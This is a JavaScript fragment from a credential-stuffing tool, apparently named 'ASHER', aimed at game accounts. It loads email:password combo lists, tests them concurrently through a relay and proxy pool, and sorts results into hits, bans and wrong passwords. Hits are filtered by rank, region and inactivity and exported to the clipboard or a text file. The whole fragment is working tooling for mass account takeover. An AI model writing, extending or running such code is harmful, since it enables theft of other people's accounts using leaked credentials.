    else if (f === 'hit') rows = A_STATE.results.filter(r => r.status === 'hit');
    else if (f === 'banned') rows = A_STATE.results.filter(r => r.status === 'banned');
    else if (f === 'wrong_pw') rows = A_STATE.results.filter(r => r.status === 'wrong_pw');
    else if (f === 'error') rows = A_STATE.results.filter(r => r.status === 'error' || r.status === 'sign_err');
    else if (f === 'filtered') rows = A_STATE.results.filter(r => r.status === 'hit' && aPassesFilters(r));
    else rows = A_STATE.results;

    if (!rows.length) {
      A.results.innerHTML = `<div class="empty">no rows for "${f}"</div>`;
      return;
    }

    const frag = document.createDocumentFragment();
    rows.slice(-500).forEach(r => {
      const div = document.createElement('div');
      div.className = `result-row acc ${r.status}`;
      const inact = aInactiveDays(r.last);
      div.innerHTML = `
        <span class="r-tag ${r.status}">${r.status.replace('_',' ')}</span>
        <span class="r-combo"><b>${escapeHtml(r.email)}</b>:${escapeHtml(r.password)}</span>
        <span class="r-ign">${escapeHtml(r.ign || '—')}</span>
        <span class="r-rank">${escapeHtml(rankName(r.rank))}</span>
        <span class="r-last">${inact != null ? inact + 'd inactive' : (r.region ? escapeHtml(r.region) : '—')}</span>
        <span class="r-meta">${escapeHtml((r.message || r.reason || '').slice(0, 22))}</span>
      `;
      frag.appendChild(div);
    });
    A.results.innerHTML = '';
    A.results.appendChild(frag);
  }

  async function aRun() {
    if (A_STATE.running) return;
    const relay = relayUrl(A.relay, A.worker);
    if (!relay) { toast('set a relay URL'); return; }

    A_STATE.pool = A.pool.value.split(/\r?\n/).map(s => s.trim()).filter(Boolean);

    let combos;
    if (A.mode.value === 'file' && A.file.files.length) {
      combos = aParseCombos(await A.file.files[0].text());
    } else {
      combos = aParseCombos(A.input.value);
    }
    if (!combos.length) { toast('no combos'); return; }

    const threads = Math.max(1, Math.min(30, parseInt(A.threads.value, 10) || 8));
    const delay = Math.max(0, Math.min(5000, parseInt(A.delay.value, 10) || 0));

    A_STATE.running = true;
    A_STATE.aborter = new AbortController();
    A_STATE.stats = { done: 0, total: combos.length, hit: 0, banned: 0, wrong_pw: 0,
                      no_account: 0, limit: 0, error: 0, sign_err: 0 };
    A_STATE.results = [];
    A_STATE.filter = 'all';
    A_STATE.t0 = now();

    document.querySelectorAll('[data-afilter]').forEach(b => {
      b.dataset.active = b.dataset.afilter === 'all' ? '1' : '';
    });

    A.run.disabled = true;
    A.stop.disabled = false;
    A.wrap.hidden = false;
    A.results.innerHTML = `<div class="empty">running…</div>`;
    aUpdateStats();

    A_STATE.tm = setInterval(() => {
      A.stTime.textContent = ((now() - A_STATE.t0) / 1000).toFixed(1) + 's';
    }, 100);

    let next = 0;
    const total = combos.length;

    async function worker() {
      while (A_STATE.running) {
        const i = next++;
        if (i >= total) return;
        const [email, pw] = combos[i];
        let res;
        try { res = await aCheckOne(email, pw, relay, A_STATE.aborter.signal); }
        catch (e) { if (e.name === 'AbortError') return; res = { email, password: pw, status: 'error', reason: e.message }; }
        A_STATE.results.push(res);
        const s = A_STATE.stats;
        s.done++;
        if (res.status in s) s[res.status]++;
        aUpdateStats();
        aRender();
        A.label.textContent = `results · ${s.done}/${total}`;
        if (delay > 0) await new Promise(r => setTimeout(r, delay));
      }
    }

    await Promise.all(Array.from({ length: threads }, () => worker()));

    clearInterval(A_STATE.tm);
    A_STATE.running = false;
    A.run.disabled = false;
    A.stop.disabled = true;
    A.stTime.textContent = ((now() - A_STATE.t0) / 1000).toFixed(1) + 's';
    toast(`done — ${A_STATE.stats.hit} hit / ${A_STATE.stats.total}`);
  }

  A.run.addEventListener('click', aRun);
  A.stop.addEventListener('click', () => {
    if (!A_STATE.running) return;
    A_STATE.running = false;
    if (A_STATE.aborter) A_STATE.aborter.abort();
    clearInterval(A_STATE.tm);
    A.run.disabled = false;
    A.stop.disabled = true;
    toast('stopped');
  });
  A.clear.addEventListener('click', () => {
    A_STATE.running = false;
    if (A_STATE.aborter) A_STATE.aborter.abort();
    clearInterval(A_STATE.tm);
    A_STATE.results = [];
    A_STATE.stats = {};
    aUpdateStats();
    A.results.innerHTML = '';
    A.wrap.hidden = true;
    A.stTime.textContent = '0.0s';
    A.run.disabled = false;
    A.stop.disabled = true;
    toast('cleared');
  });

  A.mode.addEventListener('change', () => {
    const isFile = A.mode.value === 'file';
    A.pasteRow.hidden = isFile;
    A.fileRow.hidden = !isFile;
  });

  document.querySelectorAll('[data-afilter]').forEach(b => {
    b.addEventListener('click', () => {
      document.querySelectorAll('[data-afilter]').forEach(x => x.dataset.active = '');
      b.dataset.active = '1';
      A_STATE.filter = b.dataset.afilter;
      aRender();
    });
  });

  function aHitLines() {
    return A_STATE.results
      .filter(r => r.status === 'hit' && aPassesFilters(r))
      .map(r => {
        const inact = aInactiveDays(r.last);
        return `${r.email}:${r.password} | ${r.ign || '?'} | ${rankName(r.rank)} | ${r.region || '?'} | ${inact != null ? inact + 'd' : '?'}`;
      });
  }

  A.copyHits.addEventListener('click', async () => {
    const lines = aHitLines();
    if (!lines.length) { toast('no hits'); return; }
    try { await navigator.clipboard.writeText(lines.join('\n')); toast(`copied ${lines.length}`); }
    catch { toast('clipboard blocked'); }
  });

  A.dlHits.addEventListener('click', () => {
    const lines = aHitLines();
    if (!lines.length) { toast('no hits'); return; }
    const stamp = new Date().toISOString().slice(0, 10);
    const blob = new Blob([lines.join('\n') + '\n'], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `asher_hits_${stamp}.txt`;
    document.body.appendChild(a); a.click(); a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
    toast(`downloaded ${lines.length} hits`);
  });

  console.log(
    '%c ASHER %c mlbb suite loaded ',
    'background:#7c5cff;color:#fff;padding:4px 8px;border-radius:4px 0 0 4px;font-weight:700;',
    'background:#14141d;color:#9a9aab;padding:4px 8px;border-radius:0 4px 4px 0;'
  );
})();